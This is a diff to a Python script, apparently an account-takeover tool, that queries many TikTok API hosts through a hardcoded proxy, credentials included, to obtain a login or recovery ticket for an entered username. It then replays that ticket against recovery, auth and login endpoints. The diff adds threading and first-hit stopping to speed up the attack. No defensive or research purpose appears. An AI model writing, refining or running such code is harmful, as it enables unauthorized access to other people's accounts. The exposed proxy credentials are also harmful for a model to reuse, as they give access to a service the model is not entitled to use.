@@ -4,6 +4,7 @@ import random
 import secrets
 import SignerPy
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
 
 
 class TikTokFlow:
@@ -12,34 +13,53 @@ class TikTokFlow:
         self.session = requests.Session()
 
         proxy = "infproxy_checkemail509:NLI8oq4ZQC2fJ3yJDcSv@proxy.infiniteproxies.com:1111"
-        self.proxy_dict = {
-            "http": f"http://{proxy}",
-            "https": f"http://{proxy}"
-        }
+        self.proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
 
-        self.hosts = [  # 👈 نفس الهوستات بدون حذف
-            "api16-core-aion-useast5.us.tiktokv.com","api16-core-apix-quic.tiktokv.com",
-            "api16-core-apix.tiktokv.com","api16-core-baseline.tiktokv.com",
-            "api16-core-c-alisg.tiktokv.com","api16-core-c-useast1a.tiktokv.com",
-            "api16-core-quic.tiktokv.com","api16-core-useast5.us.tiktokv.com",
-            "api16-core-useast8.us.tiktokv.com","api16-core-va.tiktokv.com",
-            "api16-core-ycru.tiktokv.com","api16-core-zr.tiktokv.com",
-            "api16-core.tiktokv.com","api16-core.ttapis.com",
-            "api16-normal-aion-useast5.us.tiktokv.com","api16-normal-apix-quic.tiktokv.com",
-            "api16-normal-apix.tiktokv.com","api16-normal-baseline.tiktokv.com",
-            "api16-normal-c-alisg.tiktokv.com","api16-normal-c-useast1a.tiktokv.com",
-            "api16-normal-c-useast1a.musical.ly","api16-normal-no1a.tiktokv.eu",
-            "api16-normal-quic.tiktokv.com","api16-normal-useast5.tiktokv.us",
-            "api16-normal-useast5.us.tiktokv.com","api16-normal-useast8.us.tiktokv.com",
-            "api16-normal-va.tiktokv.com","api16-normal-vpc2-useast5.us.tiktokv.com",
-            "api16-normal-zr.tiktokv.com","api16-normal.tiktokv.com",
-            "api16-normal.ttapis.com","api19-core-c-alisg.tiktokv.com",
-            "api19-core-c-useast1a.tiktokv.com","api19-core-useast5.us.tiktokv.com",
-            "api19-core-va.tiktokv.com","api19-core-zr.tiktokv.com",
-            "api19-core.tiktokv.com","api19-normal-c-alisg.tiktokv.com",
-            "api19-normal-c-useast1a.musical.ly","api19-normal-c-useast1a.tiktokv.com",
-            "api19-normal-useast5.us.tiktokv.com","api19-normal-va.tiktokv.com",
-            "api19-normal-zr.tiktokv.com","api19-normal.tiktokv.com"
+        self.hosts = [  # نفس الهوستات بدون حذف
+            "api16-core-aion-useast5.us.tiktokv.com",
+            "api16-core-apix-quic.tiktokv.com",
+            "api16-core-apix.tiktokv.com",
+            "api16-core-baseline.tiktokv.com",
+            "api16-core-c-alisg.tiktokv.com",
+            "api16-core-c-useast1a.tiktokv.com",
+            "api16-core-quic.tiktokv.com",
+            "api16-core-useast5.us.tiktokv.com",
+            "api16-core-useast8.us.tiktokv.com",
+            "api16-core-va.tiktokv.com",
+            "api16-core-ycru.tiktokv.com",
+            "api16-core-zr.tiktokv.com",
+            "api16-core.tiktokv.com",
+            "api16-core.ttapis.com",
+            "api16-normal-aion-useast5.us.tiktokv.com",
+            "api16-normal-apix-quic.tiktokv.com",
+            "api16-normal-apix.tiktokv.com",
+            "api16-normal-baseline.tiktokv.com",
+            "api16-normal-c-alisg.tiktokv.com",
+            "api16-normal-c-useast1a.tiktokv.com",
+            "api16-normal-c-useast1a.musical.ly",
+            "api16-normal-no1a.tiktokv.eu",
+            "api16-normal-quic.tiktokv.com",
+            "api16-normal-useast5.tiktokv.us",
+            "api16-normal-useast5.us.tiktokv.com",
+            "api16-normal-useast8.us.tiktokv.com",
+            "api16-normal-va.tiktokv.com",
+            "api16-normal-vpc2-useast5.us.tiktokv.com",
+            "api16-normal-zr.tiktokv.com",
+            "api16-normal.tiktokv.com",
+            "api16-normal.ttapis.com",
+            "api19-core-c-alisg.tiktokv.com",
+            "api19-core-c-useast1a.tiktokv.com",
+            "api19-core-useast5.us.tiktokv.com",
+            "api19-core-va.tiktokv.com",
+            "api19-core-zr.tiktokv.com",
+            "api19-core.tiktokv.com",
+            "api19-normal-c-alisg.tiktokv.com",
+            "api19-normal-c-useast1a.musical.ly",
+            "api19-normal-c-useast1a.tiktokv.com",
+            "api19-normal-useast5.us.tiktokv.com",
+            "api19-normal-va.tiktokv.com",
+            "api19-normal-zr.tiktokv.com",
+            "api19-normal.tiktokv.com"
         ]
 
         self.base_params = {
@@ -74,11 +94,11 @@ class TikTokFlow:
         p = self.base_params.copy()
         ts = int(time.time())
         p["ts"] = ts
-        p["_rticket"] = int(ts * 1000)
+        p["_rticket"] = ts * 1000
         return p
 
     # =========================
-    # LOOKUP (FULL RESPONSE)
+    # LOOKUP (FAST + STOP ON HIT)
     # =========================
     def _lookup(self, host):
         try:
@@ -98,10 +118,9 @@ class TikTokFlow:
 
             if acc:
                 a = acc[0]
+
                 return {
-                    "stage": "lookup",
                     "host": host,
-                    "status": r.status_code,
                     "raw": r.text,
                     "ticket": a.get("passport_ticket") or a.get("not_login_ticket"),
                     "oauth": a.get("oauth_login_only", False)
@@ -111,24 +130,36 @@ class TikTokFlow:
             return None
 
     def get_ticket(self):
+        result = None
+
         with ThreadPoolExecutor(max_workers=25) as ex:
-            for res in as_completed(ex.map(lambda h: self._lookup(h), self.hosts)):
+            futures = {ex.submit(self._lookup, h): h for h in self.hosts}
+
+            for f in as_completed(futures):
+                res = f.result()
                 if res:
-                    print("\n🔥 LOOKUP SUCCESS:")
+                    result = res
+                    print("\n🔥 LOOKUP HIT ->", res["host"])
                     print(res["raw"])
-                    return res["ticket"], res["oauth"], res
+                    break
+
+        if result:
+            return result["ticket"], result["oauth"], result
 
         return None, None, None
 
     # =========================
-    # SAFE (FULL RESPONSE)
+    # SAFE (STOP FIRST MATCH)
     # =========================
     def safe(self, ticket):
-        result = None
+        lock = threading.Lock()
+        result = {"found": False, "data": None}
 
         def run(host):
-            nonlocal result
             try:
+                if result["found"]:
+                    return
+
                 params = self.fresh_params()
                 params["not_login_ticket"] = ticket
                 params["target"] = "recover_account"
@@ -142,28 +173,34 @@ class TikTokFlow:
                 )
 
                 if "2029" in r.text:
-                    result = {
-                        "stage": "safe",
-                        "host": host,
-                        "raw": r.text
-                    }
+                    with lock:
+                        result["found"] = True
+                        result["data"] = {
+                            "host": host,
+                            "raw": r.text
+                        }
+
             except:
                 pass
 
         with ThreadPoolExecutor(max_workers=25) as ex:
             list(ex.map(run, self.hosts))
 
-        return result
+        return result["data"]
 
     # =========================
-    # AUTH (FULL RESPONSE)
+    # AUTH
     # =========================
     def auth(self, ticket):
+        lock = threading.Lock()
         result = None
 
         def run(host):
             nonlocal result
             try:
+                if result:
+                    return
+
                 params = self.fresh_params()
                 params["not_login_ticket"] = ticket
 
@@ -176,11 +213,12 @@ class TikTokFlow:
                 )
 
                 if "success" in r.text:
-                    result = {
-                        "stage": "auth",
-                        "host": host,
-                        "raw": r.text
-                    }
+                    with lock:
+                        result = {
+                            "host": host,
+                            "raw": r.text
+                        }
+
             except:
                 pass
 
@@ -190,14 +228,18 @@ class TikTokFlow:
         return result
 
     # =========================
-    # LOGIN (FULL RESPONSE)
+    # LOGIN
     # =========================
     def login(self, ticket):
+        lock = threading.Lock()
         result = None
 
         def run(host):
             nonlocal result
             try:
+                if result:
+                    return
+
                 params = self.fresh_params()
                 params["passport_ticket"] = ticket
 
@@ -209,12 +251,13 @@ class TikTokFlow:
                     timeout=5
                 )
 
-                result = {
-                    "stage": "login",
-                    "host": host,
-                    "status": r.status_code,
-                    "raw": r.text
-                }
+                with lock:
+                    result = {
+                        "host": host,
+                        "status": r.status_code,
+                        "raw": r.text
+                    }
+
             except:
                 pass
 
@@ -224,30 +267,24 @@ class TikTokFlow:
         return result
 
 
+# =========================
+# RUN
+# =========================
 if __name__ == "__main__":
     user = input("Enter username: ")
     flow = TikTokFlow(user)
 
     ticket, oauth, lookup_res = flow.get_ticket()
 
-    if not ticket:
-        print("❌ no ticket")
-        exit()
-
     print("\n🎫 Ticket:", ticket)
-    print("🔐 AUTH FLAG:", oauth)
+    print("🔐 AUTH:", oauth)
 
     if not oauth:
-        login_res = flow.login(ticket)
-        print("\n🔥 LOGIN RESPONSE:")
-        print(login_res)
+        print("\n🔥 LOGIN:", flow.login(ticket))
 
     else:
         safe_res = flow.safe(ticket)
-        print("\n🔥 SAFE RESPONSE:")
-        print(safe_res)
+        print("\n🔥 SAFE:", safe_res)
 
         if safe_res:
-            auth_res = flow.auth(ticket)
-            print("\n🔥 AUTH RESPONSE:")
-            print(auth_res)
+            print("\n🔥 AUTH:", flow.auth(ticket))
